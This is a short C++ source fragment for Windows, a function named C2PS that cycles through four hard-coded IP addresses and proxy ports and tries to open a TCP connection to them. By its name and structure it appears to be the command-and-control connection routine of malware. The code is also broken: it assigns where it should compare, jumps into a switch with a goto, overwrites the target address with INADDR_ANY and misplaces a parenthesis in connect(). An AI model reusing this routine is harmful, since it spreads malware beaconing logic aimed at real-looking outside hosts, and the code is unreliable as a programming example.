#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <array>
#include <direct.h>;
#include <sstream>;
#include <filesystem>;
#include <sstream>;
#include <Ws2tcpip.h>;
#include <tchar.h>;
#include <fstream>;
#include <stack>;
#include <map>;
using namespace std;
SOCKET C2PS() {
	struct ips {
		string ip1 = "217.113.122.142";
		string ip2 = "185.118.141.254";
		string ip3 = "91.211.245.176";
		string ip4 = "188.100.212.208";
	}ips;
	SOCKET s;
	SOCKADDR_IN target;
	std::map<string, int> SLoc{ {"3128",0},{"808",0},{"8080",0},{"21129",0} };
	bool flag = true;
	while (flag = true) {
	int PORT1 = 8080;
	switch (flag = true||false) {
	start:
	int count = 0;
	case false: 
		switch (count) {
		case 0:
			PORT1 = 3128;
			InetPton(AF_INET, _T("217.113.122.142"), &target.sin_addr.s_addr);
			count++;
		case 1:PORT1 = 808;
			InetPton(AF_INET, _T("185.118.141.254"), &target.sin_addr.s_addr);
			count++;
		case 2: PORT1 = 21129;
			InetPton(AF_INET, _T("188.100.212.208"), &target.sin_addr.s_addr);
			count++;
		default: std::cout << "no servers available";	
		}
	case true: InetPton(AF_INET, _T("91.211.245.176"), &target.sin_addr.s_addr);
		continue;
	}
		target.sin_family = AF_INET;
		target.sin_port = htons(PORT1);
		target.sin_addr.s_addr = htonl(INADDR_ANY);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET)
		{
			printf("invalid socket");
			flag = false;
			return false;
		}
		try {
			bool flag = true;
			float timer = 0.000f;
			while (flag = true) {
				timer += timer + 0.02;
				if (connect(s, (SOCKADDR*)&target, sizeof(target)) == SOCKET_ERROR)
				{
					printf("failed to connect faulty socket\n");
					std::cout << "SOCKET ERROR: " << SOCKET_ERROR;
					flag = false;
					goto start;
				}
				else if (connect(s, (SOCKADDR*)&target, sizeof(target) != SOCKET_ERROR)) {
					return s;
				}
			}
		}
		catch (std::exception ex) {
			std::cout << "" << ex.what();
		}
	}
}